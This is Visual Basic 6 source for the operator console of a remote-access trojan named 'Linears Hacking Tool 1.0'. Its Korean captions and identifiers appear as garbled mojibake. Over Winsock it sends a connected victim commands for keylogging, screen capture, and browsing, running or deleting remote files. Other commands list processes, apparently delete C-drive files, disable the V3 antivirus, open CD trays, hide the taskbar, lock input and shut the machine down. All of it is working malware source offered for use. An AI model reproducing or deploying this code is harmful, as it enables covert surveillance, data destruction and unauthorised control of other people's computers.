VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.2#0"; "richtx32.ocx"
Object = "{747C7273-3845-411B-B3BB-0EF3AAFDC196}#10.0#0"; "FileTransfer.ocx"
Begin VB.Form Form1 
   BorderStyle     =   1  '���� ����
   Caption         =   "Linears Hacking Tool 1.0"
   ClientHeight    =   5505
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   7335
   FillColor       =   &H00FFFFFF&
   ForeColor       =   &H00FFFFFF&
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5505
   ScaleWidth      =   7335
   StartUpPosition =   2  'ȭ�� ���
   Begin VB.CommandButton �ͽ��� 
      Caption         =   "�ͽ��÷η�"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   65
      Top             =   3720
      Width           =   1335
   End
   Begin FileTransfer.ctlFileTransfer FT 
      Left            =   6840
      Top             =   4080
      _ExtentX        =   847
      _ExtentY        =   847
      ReceiveDirPath  =   "C:\Documents and Settings\Administrator\���� ȭ��\����Ʈ���̳� ����\Lineras Hacking tool\Ŭ���̾�Ʈ"
      Version         =   2.1
   End
   Begin MSWinsockLib.Winsock ��� 
      Index           =   0
      Left            =   6840
      Top             =   960
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   2514
   End
   Begin VB.TextBox ����ǥ�� 
      Alignment       =   2  '��� ����
      BackColor       =   &H00E0E0E0&
      BeginProperty Font 
         Name            =   "����"
         Size            =   9
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   270
      Left            =   120
      Locked          =   -1  'True
      TabIndex        =   19
      Text            =   "Linears Hacking Tool By.���׾ƽ� - ���θ����̸� , �ǿ����������� -"
      Top             =   5160
      Width           =   7095
   End
   Begin VB.CommandButton �����ڸ�� 
      Caption         =   "������ ��� ����"
      Enabled         =   0   'False
      Height          =   495
      Left            =   5160
      TabIndex        =   18
      Top             =   4560
      Width           =   2055
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   6840
      Top             =   480
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton ���� 
      Caption         =   "���� ��Ű��"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   17
      Top             =   4680
      Width           =   1335
   End
   Begin VB.CommandButton discon 
      Caption         =   "���� ����"
      Enabled         =   0   'False
      Height          =   255
      Left            =   4080
      TabIndex        =   16
      Top             =   480
      Width           =   975
   End
   Begin VB.ListBox ������ 
      Enabled         =   0   'False
      Height          =   4020
      ItemData        =   "Form1.frx":581A
      Left            =   5160
      List            =   "Form1.frx":581C
      TabIndex        =   15
      Top             =   360
      Width           =   2055
   End
   Begin VB.CommandButton ��ũ���� 
      Caption         =   "��ũ����"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   14
      Top             =   3360
      Width           =   1335
   End
   Begin VB.CommandButton ���μ��� 
      Caption         =   "���μ��� ����"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   13
      Top             =   3000
      Width           =   1335
   End
   Begin VB.CommandButton ���� 
      Caption         =   "���� �Ⱦ��"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   12
      Top             =   2640
      Width           =   1335
   End
   Begin VB.CommandButton ���̷��� 
      Caption         =   "���̷��� �ɱ�"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   11
      Top             =   2280
      Width           =   1335
   End
   Begin VB.CommandButton Ű�α� 
      Caption         =   "Ű �α�"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   10
      Top             =   1920
      Width           =   1335
   End
   Begin VB.CommandButton �峭 
      Caption         =   "�峭ġ��"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   9
      Top             =   1560
      Width           =   1335
   End
   Begin VB.CommandButton ä�� 
      Caption         =   "ä��"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   8
      Top             =   1200
      Width           =   1335
   End
   Begin VB.CommandButton �޽��� 
      Caption         =   "�޽���"
      Enabled         =   0   'False
      Height          =   375
      Left            =   120
      TabIndex        =   7
      Top             =   840
      Width           =   1335
   End
   Begin VB.PictureBox Picture1 
      Height          =   4215
      Left            =   1560
      Picture         =   "Form1.frx":581E
      ScaleHeight     =   4155
      ScaleWidth      =   3435
      TabIndex        =   6
      Top             =   840
      Width           =   3495
      Begin VB.Frame �ͽ� 
         Caption         =   "�ͽ��÷η�"
         Height          =   1095
         Left            =   120
         TabIndex        =   66
         Top             =   1920
         Visible         =   0   'False
         Width           =   3135
         Begin VB.CommandButton Command18 
            Caption         =   "Ű��"
            Height          =   375
            Left            =   120
            TabIndex        =   68
            Top             =   600
            Width           =   1095
         End
         Begin VB.TextBox �ּ� 
            Height          =   270
            Left            =   120
            TabIndex        =   67
            Text            =   "http://cafe.naver.com/myvb.cafe"
            Top             =   240
            Width           =   2895
         End
      End
      Begin VB.Frame keylog 
         Caption         =   "KEY LOG"
         Height          =   375
         Left            =   120
         TabIndex        =   61
         Top             =   120
         Visible         =   0   'False
         Width           =   3135
         Begin VB.CommandButton Command15 
            Caption         =   "Ű���� ����"
            Height          =   255
            Left            =   1680
            TabIndex        =   64
            Top             =   3480
            Width           =   1335
         End
         Begin VB.CommandButton Command14 
            Caption         =   "Ű���� �б�"
            Height          =   255
            Left            =   120
            TabIndex        =   63
            Top             =   3480
            Width           =   1335
         End
         Begin VB.TextBox key 
            Height          =   3255
            Left            =   120
            Locked          =   -1  'True
            MultiLine       =   -1  'True
            ScrollBars      =   3  '�����
            TabIndex        =   62
            Top             =   240
            Width           =   2895
         End
      End
      Begin VB.Frame ������ 
         Caption         =   "���� �Ⱦ��"
         Height          =   255
         Left            =   240
         TabIndex        =   52
         Top             =   120
         Visible         =   0   'False
         Width           =   2895
         Begin VB.CommandButton Command19 
            Height          =   300
            Left            =   2040
            TabIndex        =   60
            Top             =   3480
            Width           =   735
         End
         Begin VB.CommandButton del 
            Caption         =   "����"
            Height          =   300
            Left            =   1080
            TabIndex        =   59
            Top             =   3480
            Width           =   855
         End
         Begin VB.CommandButton Run 
            Caption         =   "����"
            Height          =   300
            Left            =   120
            TabIndex        =   58
            Top             =   3480
            Width           =   855
         End
         Begin VB.CommandButton Command16 
            Height          =   255
            Left            =   2040
            TabIndex        =   57
            Top             =   3120
            Width           =   735
         End
         Begin VB.CommandButton renew 
            Caption         =   "�����б�"
            Height          =   255
            Left            =   1080
            TabIndex        =   56
            Top             =   3120
            Width           =   855
         End
         Begin VB.CommandButton up 
            Caption         =   "��������"
            Height          =   255
            Left            =   120
            TabIndex        =   55
            Top             =   3120
            Width           =   855
         End
         Begin VB.ListBox List1 
            Height          =   2400
            Left            =   120
            TabIndex        =   54
            Top             =   600
            Width           =   2655
         End
         Begin VB.TextBox list1Text 
            Height          =   270
            Left            =   120
            Locked          =   -1  'True
            TabIndex        =   53
            Top             =   240
            Width           =   2655
         End
      End
      Begin VB.Frame ���̷� 
         Caption         =   "���̷��� �ɱ�"
         Height          =   975
         Left            =   480
         TabIndex        =   40
         Top             =   3120
         Visible         =   0   'False
         Width           =   2775
         Begin VB.CommandButton Command12 
            Caption         =   "�˾� V3 ������"
            Height          =   255
            Left            =   120
            TabIndex        =   49
            Top             =   600
            Width           =   2535
         End
         Begin VB.CommandButton Command11 
            Caption         =   "C����̺� ���� �޸��� ����"
            Height          =   255
            Left            =   120
            TabIndex        =   48
            Top             =   240
            Width           =   2535
         End
      End
      Begin VB.Frame �峭�� 
         Caption         =   "�峭 ġ��"
         Height          =   255
         Left            =   480
         TabIndex        =   35
         Top             =   120
         Visible         =   0   'False
         Width           =   2775
         Begin VB.CommandButton Command13 
            Caption         =   "��罺ũ�� "
            Enabled         =   0   'False
            Height          =   300
            Left            =   120
            TabIndex        =   50
            Top             =   2760
            Width           =   1695
         End
         Begin VB.CommandButton Command10 
            Caption         =   "��ǻ�� ��������"
            Height          =   255
            Left            =   120
            TabIndex        =   47
            Top             =   2400
            Width           =   1695
         End
         Begin VB.CommandButton Command9 
            Caption         =   "Ǯ��"
            Height          =   255
            Left            =   1920
            TabIndex        =   46
            Top             =   2040
            Width           =   735
         End
         Begin VB.CommandButton Command8 
            Caption         =   "��°͸��� ������"
            Height          =   255
            Left            =   120
            TabIndex        =   45
            Top             =   2040
            Width           =   1695
         End
         Begin VB.CommandButton Command7 
            Caption         =   "���콺 Ű���� ����"
            Height          =   255
            Left            =   120
            TabIndex        =   44
            Top             =   1680
            Width           =   1695
         End
         Begin VB.CommandButton Command6 
            Caption         =   "���̱�"
            Height          =   255
            Left            =   1920
            TabIndex        =   43
            Top             =   1320
            Width           =   735
         End
         Begin VB.CommandButton Command5 
            Caption         =   "����sĿ���������"
            Height          =   255
            Left            =   120
            TabIndex        =   42
            Top             =   1320
            Width           =   1695
         End
         Begin VB.CommandButton Command2 
            Caption         =   "���콺 �¿캯��"
            Height          =   255
            Left            =   120
            TabIndex        =   41
            Top             =   960
            Width           =   1695
         End
         Begin VB.CommandButton �۾��� 
            Caption         =   "���̱�"
            Height          =   255
            Left            =   1920
            TabIndex        =   39
            Top             =   600
            Width           =   735
         End
         Begin VB.CommandButton �۾��� 
            Caption         =   "�۾�ǥ���� �����"
            Height          =   255
            Left            =   120
            TabIndex        =   38
            Top             =   600
            Width           =   1695
         End
         Begin VB.CommandButton nCD 
            Caption         =   "�ݱ�"
            Height          =   255
            Left            =   1920
            TabIndex        =   37
            Top             =   240
            Width           =   735
         End
         Begin VB.CommandButton CD 
            Caption         =   "CD�� ����"
            Height          =   255
            Left            =   120
            TabIndex        =   36
            Top             =   240
            Width           =   1695
         End
      End
      Begin VB.Frame ä�ù� 
         Caption         =   "ä��"
         Height          =   2175
         Left            =   120
         TabIndex        =   29
         Top             =   1920
         Visible         =   0   'False
         Width           =   3135
         Begin RichTextLib.RichTextBox Text3 
            Height          =   1215
            Left            =   120
            TabIndex        =   34
            Top             =   480
            Width           =   2895
            _ExtentX        =   5106
            _ExtentY        =   2143
            _Version        =   393217
            Enabled         =   -1  'True
            ReadOnly        =   -1  'True
            ScrollBars      =   2
            TextRTF         =   $"Form1.frx":16A0B
         End
         Begin VB.CommandButton Command4 
            Caption         =   "��üä�ù�"
            Height          =   300
            Left            =   600
            TabIndex        =   32
            Top             =   120
            Width           =   1155
         End
         Begin VB.CommandButton Command3 
            Caption         =   "�⺻ä�ù�"
            Height          =   300
            Left            =   1800
            TabIndex        =   31
            Top             =   120
            Width           =   1215
         End
         Begin VB.TextBox Text4 
            Height          =   270
            Left            =   120
            TabIndex        =   30
            Text            =   "�ϽǸ�"
            Top             =   1800
            Width           =   2895
         End
      End
      Begin VB.Frame ����1 
         Caption         =   "Frame1"
         Height          =   1695
         Left            =   120
         TabIndex        =   20
         Top             =   120
         Visible         =   0   'False
         Width           =   3135
         Begin VB.OptionButton ��5 
            Caption         =   "�����"
            Height          =   180
            Left            =   1800
            TabIndex        =   33
            Top             =   1440
            Width           =   1095
         End
         Begin VB.TextBox ��Ÿ 
            Height          =   270
            Left            =   120
            TabIndex        =   28
            Text            =   "Text3"
            Top             =   240
            Width           =   2895
         End
         Begin VB.CommandButton Command1 
            Caption         =   "�׽�Ʈ"
            Height          =   375
            Left            =   120
            TabIndex        =   27
            Top             =   1200
            Width           =   735
         End
         Begin VB.OptionButton ��4 
            Caption         =   "YES,NO"
            Height          =   180
            Left            =   1800
            TabIndex        =   26
            Top             =   1200
            Width           =   1095
         End
         Begin VB.OptionButton ��3 
            Caption         =   "����ǥ"
            Height          =   180
            Left            =   1800
            TabIndex        =   25
            Top             =   960
            Width           =   855
         End
         Begin VB.OptionButton ��2 
            Caption         =   "����"
            Height          =   180
            Left            =   840
            TabIndex        =   24
            Top             =   960
            Width           =   855
         End
         Begin VB.OptionButton ��1 
            Caption         =   "�⺻"
            Height          =   180
            Left            =   120
            TabIndex        =   23
            Top             =   960
            Value           =   -1  'True
            Width           =   735
         End
         Begin VB.CommandButton ��1 
            Caption         =   "������"
            Height          =   375
            Left            =   960
            TabIndex        =   22
            Top             =   1200
            Width           =   735
         End
         Begin VB.TextBox ��1 
            Height          =   270
            Left            =   120
            TabIndex        =   21
            Text            =   "Text3"
            Top             =   600
            Width           =   2895
         End
      End
   End
   Begin VB.TextBox Text2 
      Enabled         =   0   'False
      Height          =   270
      Left            =   2400
      TabIndex        =   5
      Text            =   "2070"
      Top             =   480
      Width           =   735
   End
   Begin VB.CommandButton con 
      Caption         =   "����"
      Enabled         =   0   'False
      Height          =   255
      Left            =   3240
      TabIndex        =   3
      Top             =   480
      Width           =   735
   End
   Begin VB.TextBox Text1 
      Enabled         =   0   'False
      Height          =   270
      Left            =   480
      TabIndex        =   1
      Text            =   "127.0.0.1"
      Top             =   480
      Width           =   1335
   End
   Begin VB.Label ip 
      Alignment       =   2  '��� ����
      Caption         =   "IP : "
      Height          =   255
      Left            =   4920
      TabIndex        =   51
      Top             =   120
      Width           =   2415
   End
   Begin VB.Label Label3 
      Alignment       =   2  '��� ����
      Caption         =   "Port : "
      Height          =   255
      Left            =   1920
      TabIndex        =   4
      Top             =   500
      Width           =   495
   End
   Begin VB.Label Label2 
      Alignment       =   2  '��� ����
      Caption         =   "IP :"
      Height          =   255
      Left            =   0
      TabIndex        =   2
      Top             =   500
      Width           =   495
   End
   Begin VB.Label Label1 
      Alignment       =   2  '��� ����
      BackStyle       =   0  '����
      Caption         =   "Linears Hacking Tools 1.0"
      BeginProperty Font 
         Name            =   "����"
         Size            =   18
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   375
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   5175
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim �޽���Ȯ�� As Boolean
Dim �޽������� As Integer
Dim ä�ù�Ȯ�� As Boolean
Dim ä�ù����� As Integer
Dim ��� As Boolean

Dim ����

Dim WIndex As Long

Private Sub �޽���_Click()
If �޽���Ȯ�� = False Then
��1.Text = "���� �޽���"
��1.Caption = "������"
��Ÿ.Text = "�ؽ�Ʈ Ÿ��Ʋ"
����1.Caption = "�޽��� ���"
�޽���Ȯ�� = True
����1.Visible = True
Else
����1.Visible = False
�޽���Ȯ�� = False
End If
End Sub



Private Sub ���_Close(Index As Integer)
���(Index).Close
End Sub

Private Sub ���_ConnectionRequest(Index As Integer, ByVal requestID As Long)
WIndex = WIndex + 1
Load ���(WIndex)
���(WIndex).Close
���(WIndex).Accept requestID
End Sub

Private Sub ���_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim b As String
���(WIndex).GetData b
If Left(b, 1) = "/" Then
������.AddItem Split(b, "/")(1)
End If
End Sub

Private Sub ���̷���_Click()
If ���̷���.Caption = "���̷��� �ɱ�" Then
���̷�.Visible = True
���̷���.Caption = "���̷��� ����"
Else
���̷�.Visible = False
���̷���.Caption = "���̷��� �ɱ�"
End If
End Sub

Private Sub ��1_Click()
On Error Resume Next
If Not InStr(��1, ":") > 0 Then
    If Not InStr(��Ÿ, ":") > 0 Then
        If ��2.Value = True Then
        �޽������� = 1
        ElseIf ��3.Value = True Then
        �޽������� = 2
        ElseIf ��4.Value = True Then
        �޽������� = 3
        ElseIf ��1.Value = True Then
        �޽������� = 0
        End If
            If ��5.Value = True Then
            Winsock1.SendData "/������:" & ��1.Text & ":" & ��Ÿ.Text & ":"
            Else
            Winsock1.SendData "/�޼���:" & ��1.Text & ":" & �޽������� & ":" & ��Ÿ.Text & ":"
            End If
    Else
        MsgBox " : ��ȣ�� ���� �ȵ˴ϴ�.", vbOKOnly, "LHTool"
    End If
Else
    MsgBox " : ��ȣ�� ���� �ȵ˴ϴ�.", vbOKOnly, "LHTool"
End If
' 0-�⺻ 1-��� 2-����ǥ 3-����
' /�޽���:�޽���:����:Ÿ��Ʋ , /�޽���:�Ծ���ŷ���ϼ�����:1:�����
End Sub

Private Sub ��ũ����_Click()
SC.Show
End Sub

Private Sub �ͽ���_Click()
If �ͽ���.Caption = "�ͽ��÷η�" Then
�ͽ�.Visible = True
�ͽ���.Caption = "�ͽ� �����"
Else
�ͽ�.Visible = False
�ͽ���.Caption = "�ͽ��÷η�"
End If
End Sub

Private Sub �۾���_Click()
Winsock1.SendData "/�۾���"
End Sub

Private Sub �۾���_Click()
Winsock1.SendData "/�۾���"
End Sub

Private Sub �峭_Click()
If �峭.Caption = "�峭ġ��" Then
�峭��.Height = 3255
�峭��.Visible = True
�峭.Caption = "�峭 �����"
Else
�峭��.Visible = False
�峭.Caption = "�峭ġ��"
End If
End Sub


Private Sub ������_DblClick()
For ���� = 0 To 99
    If ������.ListIndex = ���� Then
        Text1.Text = Split(������.Text, " ")(0)
    End If
Next ����

End Sub

Private Sub �����ڸ��_Click()
������.Enabled = True
�����ڸ��.Enabled = False
����ǥ��.Text = "������ ��� �۵���..."
���(0).Listen
ip.Caption = "IP : " & ���(0).LocalIP
End Sub


Private Sub ä��_Click()
If ä�ù�Ȯ�� = False Then
ä�ù�.Visible = True
ä�ù�Ȯ�� = True
Else
ä�ù�.Visible = False
ä�ù�Ȯ�� = False
End If
End Sub

Private Sub Ű�α�_Click()
keylog.Height = 3855
If Ű�α�.Caption = "Ű �α�" Then
keylog.Visible = True
Ű�α�.Caption = "Ű �ݱ�"
Else
keylog.Visible = False
Ű�α�.Caption = "Ű �α�"
End If
End Sub

Private Sub ��1_Click()
If �޽���Ȯ�� = True Then
    If ��1.Text = "���� �޽��� : " Then
        ��1.Text = ""
    End If
End If

End Sub

Private Sub ��Ÿ_Click()
If ��Ÿ.Text = "�ؽ�Ʈ Ÿ��Ʋ : " Then
��Ÿ.Text = ""
End If
End Sub

Private Sub ����_Click()
If ������.Caption = "���� �Ⱦ��" Then
������.Height = 3855
������.Visible = True
������.Caption = "���� �����"
Else
������.Visible = False
������.Caption = "���� �Ⱦ��"
End If
End Sub

Private Sub ����_Click()
MsgBox "����?", vbOKCancel, "!!!"
If vbOK = True Then
'Winsock1.SendData "/������"
Else
End If
End Sub

Private Sub ���μ���_Click()
Form3.Show
End Sub

Private Sub CD_Click()
Winsock1.SendData "/CD��"
End Sub

Private Sub Command1_Click()
If ��2.Value = True Then
MsgBox ��1.Text, vbCritical, ��Ÿ.Text
ElseIf ��3.Value = True Then
MsgBox ��1.Text, vbQuestion, ��Ÿ.Text
ElseIf ��4.Value = True Then
MsgBox ��1.Text, vbYesNo, ��Ÿ.Text
Else
MsgBox ��1.Text, vbOKOnly, ��Ÿ.Text
End If
End Sub

Private Sub Command10_Click()
Winsock1.SendData "/�Ĳ���"
End Sub

Private Sub Command11_Click()
MsgBox "�̰� �ϸ� ���� �׷��� �Ҳ���?", vbOKCancel, "LHTool"
If vbYes = True Then
Winsock1.SendData "/c����"
Else
End If
End Sub

Private Sub Command12_Click()
Winsock1.SendData "/��Ų�"
End Sub

Private Sub Command13_Click()
Winsock1.SendData "/��罺"
End Sub

Private Sub Command14_Click()
Winsock1.SendData "/Ű����"
End Sub

Private Sub Command15_Click()
    On Error Resume Next
    
    If key.Text <> "" Then
        Open App.Path & "KeyLog.txt" For Output As #1
        Print #1, key
        Close #1
    End If
End Sub

Private Sub Command17_Click()
If �ͽ�.Caption = "�ͽ��÷η�" Then
�ͽ�.Visible = True
�ͽ�.Caption = "�ͽ� �����"
Else
�ͽ�.Visible = False
�ͽ�.Caption = "�ͽ��÷η�"
End If
End Sub

Private Sub Command18_Click()
Winsock1.SendData "/�ͽ���=" & �ּ�.Text
End Sub

Private Sub Command2_Click()
Winsock1.SendData "/���¿�"
End Sub

Private Sub Command3_Click()
If Command3.Caption = "�⺻ä�ù�" Then
Winsock1.SendData "/��ä��"
Command3.Caption = "�⺻ê�沨"
Else
Winsock1.SendData "/��ä��"
Command3.Caption = "�⺻ä�ù�"
End If
End Sub

Private Sub Command4_Click()
����ǥ��.Text = "���� �ȵ�"
End Sub

Private Sub Command5_Click()
Winsock1.SendData "/��Ŀ��"
End Sub

Private Sub Command6_Click()
Winsock1.SendData "/��Ŀ��"
End Sub

Private Sub Command7_Click()
Winsock1.SendData "/��Ű��"
End Sub

Private Sub Command8_Click()
Winsock1.SendData "/������"
End Sub

Private Sub Command9_Click()
Winsock1.SendData "/������"
End Sub

Private Sub con_Click()
Winsock1.Connect Text1.Text, Text2.Text 'text1=IP , text2=port
Text1.Enabled = False
Text2.Enabled = False
con.Enabled = False
discon.Enabled = True
����ǥ�� = "������ ������ �õ��մϴ�."
End Sub


Private Sub del_Click()
    On Error Resume Next
    
    If Left(List1.List(List1.ListIndex), 1) <> "[" Then
        Form1.Winsock1.SendData "/[D]" & DriverName & ForderName & List1.List(List1.ListIndex)
    End If
End Sub

Private Sub discon_Click()
Winsock1.Close
����ǥ��.Text = "�������� ������ �����̽��ϴ�."
discon.Enabled = False
con.Enabled = True
Text1.Enabled = True
Text2.Enabled = True
�޽���.Enabled = False
ä��.Enabled = False
�峭.Enabled = False
Ű�α�.Enabled = False
���̷���.Enabled = False
����.Enabled = False
���μ���.Enabled = False
��ũ����.Enabled = False
�ͽ���.Enabled = False
End Sub

Private Sub Form_Load()
'Form1.Show
'Form2.Show vbModal

    FT.ReceiveDirPath = App.Path
    FT.LocalPort = 4010      '<================= LocalPort ����
    FT.RemoteHost = Winsock1.LocalIP         '<================= RemoteHost ����
    FT.RemotePort = 3010
    
End Sub



Private Sub List1_Click()
    'On Error Resume Next
    
    Dim VTemp As String
    Dim TempList As String
    
    If Left(List1.List(List1.ListIndex), 4) = "[..]" Then '// ���� ����
        up_Click '// ���� Ŭ�� ���� ���� ���� ����
        Exit Sub
    End If
    
    VTemp = Left(List1.List(List1.ListIndex), 2) '// If ���� ������ ������� �� ����
    TempList = ""
    
    If VTemp = "[-" Then '// ����̺� �̸�
        TempList = Mid$(List1.List(List1.ListIndex), 3, Len(List1.List(List1.ListIndex)))
        DriverName = Mid$(TempList, 1, Len(TempList) - 2) & ":\"
        ForderName = "" '// ����̹��� �ٲ�� ���� ������ ��� Ŭ����
        
        Winsock1.SendData "/[R]" & DriverName & ForderName & "*.*"
    ElseIf VTemp <> "[-" And Left(List1.List(List1.ListIndex), 1) = "[" Then '// ����
        TempList = Mid$(List1.List(List1.ListIndex), 2, Len(List1.List(List1.ListIndex)))
        ForderName = ForderName & Mid$(TempList, 1, Len(TempList) - 1) & "\"
        
        Winsock1.SendData "/[R]" & DriverName & ForderName & "*.*"
    End If
    
    list1Text = DriverName & ForderName & "*.*"
End Sub


Private Sub nCD_Click()
Winsock1.SendData "/CD��"
End Sub

Private Sub PRO_Click()
Winsock1.SendData "/pr��"
End Sub

Private Sub renew_Click()
    On Error Resume Next
    
    List1.Clear '// ����Ʈ �ڽ� �ʱ�ȭ
    
    If DriverName = "" Then '// ����̹� �̸� ��� ���� �ʱ�ȭ
        DriverName = "c:\"
    End If
    
    Winsock1.SendData "/[R]" & DriverName & ForderName & "*.*" '// *.*�� ��� ���� ǥ��
    
    list1Text.Text = DriverName & ForderName & "*.*"
End Sub

Private Sub Run_Click()
    On Error Resume Next
    
    If Left(List1.List(List1.ListIndex), 1) <> "[" Then
        Form1.Winsock1.SendData "/[E]" & DriverName & ForderName & List1.List(List1.ListIndex)
    End If

End Sub

Private Sub Text4_KeyDown(KeyCode As Integer, Shift As Integer)
If KeyCode = 13 Then
If Not Text2 = "" Then
    If Not InStr(Text2.Text, "/") > 0 Then
        If Not InStr(Text2.Text, ":") > 0 Then
Winsock1.SendData "/ä����:" & "��Ŀ] " & Text4.Text & vbCrLf '/ä��:aksmd �����ٷ�
            Text3.Text = Text3.Text & "��: " & Text4.Text & vbCrLf
            Text3.SelStart = Len(Text3.Text)
            Text4 = ""
            Text4.SetFocus
        Else
        End If
    Else
    End If
Else
Text2.SetFocus
End If
End If
End Sub

Private Sub up_Click()
    On Error Resume Next
    
    Dim XTemp() As String
    Dim i As Integer
    
    If ForderName <> "" Then
        XTemp = Split(ForderName, "\")
        
        If UBound(XTemp) = 1 Then
            ForderName = ""
            Form1.Winsock1.SendData "/[R]" & DriverName & ForderName & "*.*"
        Else
            ForderName = ""
        
            For i = 0 To UBound(XTemp) - 2 Step 1
                ForderName = ForderName & XTemp(i) & "\"
            Next i
            
            Form1.Winsock1.SendData "/[R]" & DriverName & ForderName & "*.*"
        End If
    End If
    
End Sub

Private Sub Winsock1_Close()
    Winsock1.Close
   ����ǥ��.Text = "������ ����Ǿ����ϴ�."
End Sub

Private Sub Winsock1_Connect()
�޽���.Enabled = True
ä��.Enabled = True
�峭.Enabled = True
Ű�α�.Enabled = True
���̷���.Enabled = True
����.Enabled = True
���μ���.Enabled = True
��ũ����.Enabled = True
�ͽ���.Enabled = True
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
    Dim X As String
    Dim i As Integer
    Dim X_ReNew() As String
    
Dim a As String '��������
Winsock1.GetData a '/ dd ����:
If Left(a, 1) = "/" Then  '���� ���� �˻� ù��° �ڸ��� "/"�̸� ture ������ false
    Select Case Mid(a, 2, 2) '����ڿ� �´� ���� �ι�°�ڸ����� ���� �׷��Ƿ� �տ� "/" �����

    Case "MS" '/ MS �޽���
    MsgBox Split(a, ":")(1)
    Exit Sub
    
    Case "Ű��" '/Ű��:Ű�α�
    MsgBox Split(a, ":")(1)
    Exit Sub
    
    Case "����" '�������� �����
    ����ǥ��.Text = "�������� ������ �����Ͽ����ϴ�."
    ��� = True
    Exit Sub
    
    Case "ä��" ' /ä��:
    Text3.SelStart = Len(Text3.TextRTF)
    Text3.Text = Text3.Text & Split(a, ":")(1)
    Exit Sub
    
    Case "����" ' /ä��:
                Form3.proList.Clear
                X_ReNew = Split(Mid$(a, 4, Len(a)), "<|>")
                
                For i = 0 To UBound(X_ReNew) Step 1
                    If X_ReNew(i) <> "" Then
                        Form3.proList.AddItem X_ReNew(i)
                    End If
                Next i
    Exit Sub
    
                Case "����" '// ���� ��ħ ������ �޾�����
                List1.Clear
                X_ReNew = Split(Mid$(a, 4, Len(a)), "<|>")
                
                For i = 0 To UBound(X_ReNew) Step 1
                    If X_ReNew(i) <> "" Then
                         List1.AddItem X_ReNew(i)
                    End If
                Next i
            Case "��2" '// ���� ��ħ �䱸�� �޾�����
                 List1.Clear
                Winsock1.SendData "/[R]" & DriverName & ForderName & "*.*"
                
    Case "Ű��"
    key.Text = key.Text & Split(a, ":")(1)
    Exit Sub
    
    End Select
End If
    
End Sub

Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
����ǥ��.Text = "���濡�� �����ϽǼ� �����ϴ�"
Winsock1.Close
Text1.Enabled = True
Text2.Enabled = True
con.Enabled = True
discon.Enabled = False
�޽���.Enabled = False
ä��.Enabled = False
�峭.Enabled = False
Ű�α�.Enabled = False
���̷���.Enabled = False
����.Enabled = False
���μ���.Enabled = False
��ũ����.Enabled = False
�ͽ���.Enabled = False
End Sub
